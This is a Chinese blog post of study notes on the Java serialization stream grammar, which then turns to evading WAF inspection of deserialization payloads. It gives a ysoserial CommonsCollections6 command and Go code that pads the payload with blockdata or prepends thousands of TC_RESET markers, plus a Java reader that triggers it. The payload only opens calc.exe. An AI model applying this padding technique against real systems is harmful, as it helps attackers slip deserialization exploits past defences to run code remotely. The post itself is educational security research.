{"title":"Java反序列化9笔记","uid":"fc0657b8e278d4cdd3f372956d7c0f2c","slug":"Java反序列化9笔记","date":"2022-09-16T11:41:59.000Z","updated":"2022-09-16T12:33:28.078Z","comments":true,"path":"api/articles/Java反序列化9笔记.json","keywords":null,"cover":[],"content":"<meta name=\"referrer\" content=\"no-referrer\"/>\n\n<h1 id=\"参考文章：\"><a href=\"#参考文章：\" class=\"headerlink\" title=\"参考文章：\"></a>参考文章：</h1><p>p牛 Java安全漫谈19</p>\n<p><a href=\"https://t.zsxq.com/06mmMZrFu\">https://t.zsxq.com/06mmMZrFu</a></p>\n<p>Object Serialization Stream Protocol</p>\n<p><a href=\"https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html\">https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html</a></p>\n<p>Java 序列化格式映射</p>\n<p><a href=\"https://github.com/1nhann/java_ser_format\">https://github.com/1nhann/java_ser_format</a></p>\n<p>Java反序列化数据绕WAF之加大量脏数据</p>\n<p><a href=\"https://mp.weixin.qq.com/s/wvKfe4xxNXWEgtQE4PdTaQ\">https://mp.weixin.qq.com/s/wvKfe4xxNXWEgtQE4PdTaQ</a></p>\n<h1 id=\"序列化流的Grammer学习：\"><a href=\"#序列化流的Grammer学习：\" class=\"headerlink\" title=\"序列化流的Grammer学习：\"></a>序列化流的Grammer学习：</h1><p>前面JDK7u21有点绕了，这次文档直接来个英文的文档，直接爆炸！！！</p>\n<p>不过还好，p牛的讲解很清楚，初步了解了一点</p>\n<h2 id=\"4个核心部分：\"><a href=\"#4个核心部分：\" class=\"headerlink\" title=\"4个核心部分：\"></a>4个核心部分：</h2><h3 id=\"stream：\"><a href=\"#stream：\" class=\"headerlink\" title=\"stream：\"></a>stream：</h3><p>stream就是指完整的序列化协议流，由三个部分组成</p>\n<h4 id=\"magic：\"><a href=\"#magic：\" class=\"headerlink\" title=\"magic：\"></a>magic：</h4><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">final static short STREAM_MAGIC &#x3D; (short)0xaced;  </code></pre>\n\n<h4 id=\"version：\"><a href=\"#version：\" class=\"headerlink\" title=\"version：\"></a>version：</h4><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">final static short STREAM_VERSION &#x3D; 5;  </code></pre>\n\n<p>magic和version都是short类型，也就是两个字节整型。值都是定好的，所以序列化协议流都是以\\xAC\\xED\\x00\\x05开头</p>\n<h4 id=\"contents：\"><a href=\"#contents：\" class=\"headerlink\" title=\"contents：\"></a>contents：</h4><pre class=\"line-numbers language-none\"><code class=\"language-none\">contents:\n\n\tcontent \n\n\tcontents content  </code></pre>\n\n<p>这是一个递归下降的规则，contents可以由一个content组成，也可由一个contents和一个content组成，这后一个contents也可以继续由contents content和content组成。最后形成编译原理里的左递归</p>\n<h3 id=\"content：\"><a href=\"#content：\" class=\"headerlink\" title=\"content：\"></a>content：</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">content: \n\n\tobject \n\n\tblockdata  </code></pre>\n\n<p>而content是由object或者blockdata组成，blockdata是一个由数组长度加数据本身组成的一个结构，里面可以填充任意内容，这也是脏数据可以填充的条件</p>\n<h3 id=\"object：\"><a href=\"#object：\" class=\"headerlink\" title=\"object：\"></a>object：</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">object: \n\n\tnewObject \n\n\tnewClass \n\n\tnewArray \n\n\tnewString \n\n\tnewEnum \n\n\tnewClassDesc \n\n\tprevObject \n\n\tnullReference \n\n\texception \n\n\tTC_RESET  </code></pre>\n\n<p>object激素真正包含Java对象的一个结构，object由上面这些组成。</p>\n<ol>\n<li>newObject：表示一个对象</li>\n<li>newClass：表示一个类</li>\n<li>newArray：表示一个数组</li>\n<li>newString：表示一个字符串</li>\n<li>newRnum：表示一个枚举</li>\n<li>newClassDesc：表示一个类定义</li>\n<li>preObject：表示一个引用，可以指向任意其他类型（通过Reference ID）</li>\n<li>nullReference：表示null</li>\n<li>exception：表示一个异常</li>\n<li>TC_RESET：重置Reference ID</li>\n</ol>\n<p>newObject就是一个实例化对象，newClass就是一个类，newClassDesc是类定义，就是对一个类的描述，比如类名，字段等</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">newObject: \n\tTC_OBJECT classDesc newHandle classdata[] &#x2F;&#x2F; data for each class \n\t\nnewClass: \n\tTC_CLASS classDesc newHandle \n\t\n\nclassDesc: \n\tnewClassDesc \n\tnullReference \n\t(ClassDesc)prevObject  \t\t\t&#x2F;&#x2F; an object required to be of type \n\n \t\t\t\t\t\t\t\t\t&#x2F;&#x2F; ClassDesc  </code></pre>\n\n<p>实例化的对象有具体的数据，所以newObject的结构就比newClass队列一个classdata[]存储这些数据，其他结构就是标识符+calssDesc+newHandle</p>\n<p>classDesc是一个普通的类定义，可以是null，可以是指针指向前面出现过的类定义，可以理解为newClassDesc的一个封装</p>\n<p>newHandle是一个唯一的ID，每个结构都会有一个ID，从0x7E0000开始，遇到下一个结构就加一，这个结构的ID被设置为唯一</p>\n<p>prevObject指针就是通过newHandle这个唯一的ID来定位它指向的结构</p>\n<h2 id=\"demo：\"><a href=\"#demo：\" class=\"headerlink\" title=\"demo：\"></a>demo：</h2><p>一个简单的User类</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">package com.zkar;\n\nimport java.io.ByteArrayOutputStream;\nimport java.io.ObjectOutputStream;\nimport java.io.Serializable;\nimport org.apache.commons.codec.binary.Base64;\n\n\n\npublic class User implements Serializable &#123;\n\tprotected String name;\n\tprotected User parent;\n\t\n\tpublic User(String name)&#123;\n\t\tthis.name &#x3D; name;\n\t&#125;\n\t\n\tpublic void setParent(User parent)&#123;\n\t\tthis.parent &#x3D; parent;\n\t&#125;\n\n\tpublic static void main(String[] args) throws Exception &#123;\n\t\tUser user &#x3D; new User(&quot;Bob&quot;);\n\t\tuser.setParent(new User(&quot;Josua&quot;));\n\t\tByteArrayOutputStream byteSteam &#x3D; new ByteArrayOutputStream();\n\t\tObjectOutputStream oos &#x3D; new ObjectOutputStream(byteSteam);\n\t\toos.writeObject(user);\n\t\tSystem.out.println(Base64.encodeBase64String(byteSteam.toByteArray()));\n\t&#125;\n&#125;</code></pre>\n\n\n\n<p>将其生成序列化数据由base64编码，这里有一点注意，使用p牛的这个代码，添加的项目插件中如果使用shiro-all.jar，那么就会找不到deBaseString方法，当然可以改成encodeToString方法，想使用deBaseString那么插件包必须使用commons-codec.jar这个包，两个包不能在同一个项目中，不然默认调用shiro-all.jar，上移都没用</p>\n<p>主要是想看源码，发现导入了源码包也不行，才发现这个问题</p>\n<h2 id=\"zkar：\"><a href=\"#zkar：\" class=\"headerlink\" title=\"zkar：\"></a>zkar：</h2><p>p牛是的序列化协议分析工具</p>\n<p><a href=\"https://github.com/phith0n/zkar\">https://github.com/phith0n/zkar</a></p>\n<p>使用它对前面生成的序列化数据进行分析</p>\n<p>zkar dump -B xxxxxxx</p>\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/31.PNG\"></p>\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/32.PNG\"></p>\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/33.PNG\"></p>\n<p>明显的包含前面的头文件magic和version</p>\n<p>contents中包含一个newObject，第一部分是ClassDesc，里面有User类的信息，有类名、SerialVersionUID、父类、属性列表等</p>\n<p>唯一的ID值为8257536，calssdata[]数组包含实例化对象的数据，有两个属性name、parent。parent在定义时也是一个User类的对象，所以在序列化数据里是一个newObject，它的classDesc也是User类的信息，前面定义过classDesc所以这里是一个TC_REFERENCE，ID相同，因为都是指向前面的那个User类的classDesc</p>\n<p>这个ID只是classDesc的ID，而parent的ID则与前面不同，不同结构ID值不一样，当相同时，就指向第一个定义的，ID值要唯一</p>\n<h1 id=\"Java序列化脏数据bypass：\"><a href=\"#Java序列化脏数据bypass：\" class=\"headerlink\" title=\"Java序列化脏数据bypass：\"></a>Java序列化脏数据bypass：</h1><p>在Crammer学习时，提到过blockdata的数据是可以随意填充的</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">content: \n\n\tobject \n\n\tblockdata \n\nblockdata: \n\n\tblockdatashort \n\n\tblockdatalong \n\nblockdatashort: \n\n\tTC_BLOCKDATA (unsigned byte) (byte)[size] \t\t \n\nblockdatalong: \n\n\tTC_BLOCKDATALONG (int) (byte)[size] </code></pre>\n\n<p>blockdata分为两种类型，short和long，区别是可以存储的数据的大小不同</p>\n<p>所以选择blockdatalong作为脏数据的填充类型</p>\n<p>其结构分为，标示符、数据长度(4字节整型)、数据内容</p>\n<p>使用go调用zkar库的方法来进行脏数据的填充</p>\n<p>使用yso生成CC6的payload</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">java -jar ysoserial-all.jar CommonsCollections6  calc.exe &gt; CC6.ser</code></pre>\n\n\n\n<h3 id=\"CC6-脏数据demo1：\"><a href=\"#CC6-脏数据demo1：\" class=\"headerlink\" title=\"CC6 脏数据demo1：\"></a>CC6 脏数据demo1：</h3><h4 id=\"go：\"><a href=\"#go：\" class=\"headerlink\" title=\"go：\"></a>go：</h4><pre class=\"line-numbers language-go\" data-language=\"go\"><code class=\"language-go\">package main\n\nimport (\n\t&quot;io&#x2F;ioutil&quot;\n\t&quot;log&quot;\n\t&quot;strings&quot;\n\n\t&quot;github.com&#x2F;phith0n&#x2F;zkar&#x2F;serz&quot;\n)\n\nfunc main() &#123;\n\tdata, _ :&#x3D; ioutil.ReadFile(&quot;CC6.ser&quot;)\n\tserialization, err :&#x3D; serz.FromBytes(data)\n\tif err !&#x3D; nil &#123;\n\t\tlog.Fatal(&quot;parse error&quot;)\n\t&#125;\n\tvar blockData &#x3D; &amp;serz.TCContent&#123;\n\t\tFlag: serz.JAVA_TC_BLOCKDATALONG,\n\t\tBlockData: &amp;serz.TCBlockData&#123;\n\t\t\tData: []byte(strings.Repeat(&quot;a&quot;, 40000)),\n\t\t&#125;,\n\t&#125;\n\tserialization.Contents &#x3D; append(serialization.Contents, blockData)\n\t&#x2F;&#x2F; serialization.Contents &#x3D; append([]*serz.TCContent&#123;blockData&#125;,\n\t&#x2F;&#x2F; \tserialization.Contents...)\n\n\tioutil.WriteFile(&quot;cc6-padding1.ser&quot;, serialization.ToBytes(), 0o755)\n&#125;\n</code></pre>\n\n\n\n<h4 id=\"Java：\"><a href=\"#Java：\" class=\"headerlink\" title=\"Java：\"></a>Java：</h4><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">package com.zkar;\n\nimport java.io.FileInputStream;\nimport java.io.InputStream;\nimport java.io.ObjectInputStream;\n\npublic class CC6bypass &#123;\n\tpublic static void read() throws Exception&#123;\n\t\tInputStream is &#x3D; new FileInputStream(&quot;cc6-padding2.ser&quot;);\n\t\tObjectInputStream ois &#x3D; new ObjectInputStream(is);\n\t\tObject obj &#x3D; ois.readObject();\n\t\tSystem.out.println(obj);\n\t&#125;\n\t\n\tpublic static void main(String[] args) throws Exception &#123;\n\t\tread();\n\t&#125;\n\n&#125;\n</code></pre>\n\n\n\n<p>可以成功弹出计算器</p>\n<h3 id=\"CC6-脏数据demo2：\"><a href=\"#CC6-脏数据demo2：\" class=\"headerlink\" title=\"CC6 脏数据demo2：\"></a>CC6 脏数据demo2：</h3><p>demo1中的脏数据是在payload的后面，在反序列化时是直接被忽略了</p>\n<p>如果waf只检测前面一段，那么无法绕过waf</p>\n<p>所以需要将脏数据填充在payload前面</p>\n<p>直接改变Contents的顺序会在反序列化是抛出异常</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">serialization.Contents &#x3D; append([]*serz.TCContent&#123;blockData&#125;, serialization.Contents...)  </code></pre>\n\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/34.PNG\"></p>\n<h4 id=\"原因：\"><a href=\"#原因：\" class=\"headerlink\" title=\"原因：\"></a>原因：</h4><p>在Java解析时进行了处理</p>\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/35.PNG\"></p>\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/36.PNG\"></p>\n<p>Java会先处理TC_RESET循环，之后</p>\n<p>在处理TC_RESET之外的结构时，如果第一个结构是blockdata会爆出异常，停止执行</p>\n<p>所以Java处理的contents里面处理TC_RESET之外的首个结构不能是blockdata、exception等</p>\n<p>前面填充内容可行是因为压根每处理到blockdata，在处理object之后，反序列化已经完成了</p>\n<p>所以换个顺序是不行的，但是Java在前面会将所有的TC_RESET去除，而TC_RESET又是object的一种结构，所以可以用TC_RESET来进行填充</p>\n<p>这样脏数据就会在前面，同时也在处理流程前面</p>\n<h3 id=\"go：-1\"><a href=\"#go：-1\" class=\"headerlink\" title=\"go：\"></a>go：</h3><pre class=\"line-numbers language-go\" data-language=\"go\"><code class=\"language-go\">package main\n\nimport (\n\t&quot;io&#x2F;ioutil&quot;\n\t&quot;log&quot;\n\n\t&quot;github.com&#x2F;phith0n&#x2F;zkar&#x2F;serz&quot;\n)\n\nfunc main() &#123;\n\tdata, _ :&#x3D; ioutil.ReadFile(&quot;cc6.ser&quot;)\n\tserialization, err :&#x3D; serz.FromBytes(data)\n\tif err !&#x3D; nil &#123;\n\t\tlog.Fatal(&quot;parse error&quot;)\n\t&#125;\n\tvar contents []*serz.TCContent\n\tfor i :&#x3D; 0; i &lt; 5000; i++ &#123;\n\t\tvar blockData &#x3D; &amp;serz.TCContent&#123;\n\t\t\tFlag: serz.JAVA_TC_RESET,\n\t\t&#125;\n\t\tcontents &#x3D; append(contents, blockData)\n\t&#125;\n\tserialization.Contents &#x3D; append(contents, serialization.Contents...)\n\tioutil.WriteFile(&quot;cc6-padding2.ser&quot;, serialization.ToBytes(), 0o755)\n&#125;\n</code></pre>\n\n","text":" 参考文章：p牛 Java安全漫谈19 https://t.zsxq.com/06mmMZrFu Object Serialization Stream Protocol https://docs.oracle.com/javase/8/docs/platform/seriali...","link":"","photos":[],"count_time":{"symbolsCount":"6.5k","symbolsTime":"6 mins."},"categories":[{"name":"Java安全","slug":"Java安全","count":11,"path":"api/categories/Java安全.json"}],"tags":[{"name":"Java","slug":"Java","count":13,"path":"api/tags/Java.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0%EF%BC%9A\"><span class=\"toc-text\">参考文章：</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%9A%84Grammer%E5%AD%A6%E4%B9%A0%EF%BC%9A\"><span class=\"toc-text\">序列化流的Grammer学习：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#4%E4%B8%AA%E6%A0%B8%E5%BF%83%E9%83%A8%E5%88%86%EF%BC%9A\"><span class=\"toc-text\">4个核心部分：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#stream%EF%BC%9A\"><span class=\"toc-text\">stream：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#magic%EF%BC%9A\"><span class=\"toc-text\">magic：</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#version%EF%BC%9A\"><span class=\"toc-text\">version：</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#contents%EF%BC%9A\"><span class=\"toc-text\">contents：</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#content%EF%BC%9A\"><span class=\"toc-text\">content：</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#object%EF%BC%9A\"><span class=\"toc-text\">object：</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#demo%EF%BC%9A\"><span class=\"toc-text\">demo：</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#zkar%EF%BC%9A\"><span class=\"toc-text\">zkar：</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#Java%E5%BA%8F%E5%88%97%E5%8C%96%E8%84%8F%E6%95%B0%E6%8D%AEbypass%EF%BC%9A\"><span class=\"toc-text\">Java序列化脏数据bypass：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#CC6-%E8%84%8F%E6%95%B0%E6%8D%AEdemo1%EF%BC%9A\"><span class=\"toc-text\">CC6 脏数据demo1：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#go%EF%BC%9A\"><span class=\"toc-text\">go：</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#Java%EF%BC%9A\"><span class=\"toc-text\">Java：</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#CC6-%E8%84%8F%E6%95%B0%E6%8D%AEdemo2%EF%BC%9A\"><span class=\"toc-text\">CC6 脏数据demo2：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%8E%9F%E5%9B%A0%EF%BC%9A\"><span class=\"toc-text\">原因：</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#go%EF%BC%9A-1\"><span class=\"toc-text\">go：</span></a></li></ol></li></ol></li></ol>","author":{"name":"Longw","slug":"blog-author","avatar":"https://userblink.csdnimg.cn/20211213/qq_57037477/pic/7db9b5c05ba342a75ddf06eecf740949-0.jpg","link":"/","description":"一个不想开挂的安全实习生","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"Typecho1.1反序列化复现","uid":"10d60eae5b46a090616c469686df0945","slug":"Typecho1-1反序列化复现","date":"2022-10-17T11:42:19.000Z","updated":"2022-10-19T13:39:17.127Z","comments":true,"path":"api/articles/Typecho1-1反序列化复现.json","keywords":null,"cover":[],"text":" 参考资料：https://github.com/aleenzz/php_bug_wiki/blob/master/1.9.%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AE%A1%E8%AE%A1.md 复现：常见的博客系统，在1.1版本的in...","link":"","photos":[],"count_time":{"symbolsCount":"13k","symbolsTime":"12 mins."},"categories":[{"name":"PHP反序列化","slug":"PHP反序列化","count":1,"path":"api/categories/PHP反序列化.json"}],"tags":[{"name":"PHP","slug":"PHP","count":2,"path":"api/tags/PHP.json"}],"author":{"name":"Longw","slug":"blog-author","avatar":"https://userblink.csdnimg.cn/20211213/qq_57037477/pic/7db9b5c05ba342a75ddf06eecf740949-0.jpg","link":"/","description":"一个不想开挂的安全实习生","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"Java反序列化8笔记","uid":"4246a945c68e3de6ca09de0bdac9f5e2","slug":"Java反序列化8笔记","date":"2022-09-16T11:41:51.000Z","updated":"2022-09-16T12:27:09.094Z","comments":true,"path":"api/articles/Java反序列化8笔记.json","keywords":null,"cover":[],"text":" 参考文章：p牛Java安全漫谈 18 https://t.zsxq.com/06RBYz7un p牛 https://t.zsxq.com/063Zz3B2F JDK7u21反序列化漏洞分析笔记 https://xz.aliyun.com/t/9704#toc-10 JDK7u...","link":"","photos":[],"count_time":{"symbolsCount":"7.8k","symbolsTime":"7 mins."},"categories":[{"name":"Java安全","slug":"Java安全","count":11,"path":"api/categories/Java安全.json"}],"tags":[{"name":"Java","slug":"Java","count":13,"path":"api/tags/Java.json"}],"author":{"name":"Longw","slug":"blog-author","avatar":"https://userblink.csdnimg.cn/20211213/qq_57037477/pic/7db9b5c05ba342a75ddf06eecf740949-0.jpg","link":"/","description":"一个不想开挂的安全实习生","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}